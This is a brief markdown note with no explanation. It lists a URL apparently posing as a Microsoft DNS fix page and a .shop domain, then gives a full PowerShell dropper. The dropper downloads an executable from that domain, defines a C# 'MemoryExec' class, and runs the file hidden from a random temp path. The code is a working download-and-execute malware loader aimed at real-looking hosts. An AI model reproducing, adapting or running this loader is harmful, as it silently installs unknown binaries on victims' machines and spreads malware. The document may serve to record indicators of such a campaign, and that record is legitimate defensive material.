# Just to F this
https://microsoft-dns-reload-6y.pages.dev/
https://polovoiinspektor.shop/rules/bash.txt

```
$url = "https://polovoiinspektor.shop/protect/GodResponsibility.exe"
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$fileBytes = $response.Content
if (-not ([AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { $_.GetTypes() } | Where-Object { $_.Name -eq "MemoryExec" })) {
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.IO;
    public class MemoryExec {
        public static void Run(byte[] exeBytes) {
            string tempFilePath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
            File.WriteAllBytes(tempFilePath, exeBytes);
            Process process = new Process();
            process.StartInfo.FileName = tempFilePath;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
        }
    }
"@
}
```
